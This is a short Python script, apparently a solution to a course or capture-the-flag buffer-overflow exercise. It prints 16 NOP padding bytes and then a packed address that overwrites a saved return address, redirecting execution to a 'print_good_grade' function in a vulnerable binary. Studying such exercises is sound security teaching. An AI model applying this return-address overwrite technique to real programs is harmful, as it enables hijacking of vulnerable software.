#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

'''directly overwrite vulnerable return address to fn print_good_grade address'''

ADDR_DIFF = 0x0c                        # %ebp - buf start address          (12-byte)
VULNERABLE_FP_SIZE = 0x04               # vulnerable frame pointer size     (4-byte)
PRINT_GOOD_GRADE_FN_ADDR = 0x80488c5    # print_good_grade function start address
sys.stdout.buffer.write(b'\x90'*(ADDR_DIFF+VULNERABLE_FP_SIZE)+pack('<I',PRINT_GOOD_GRADE_FN_ADDR))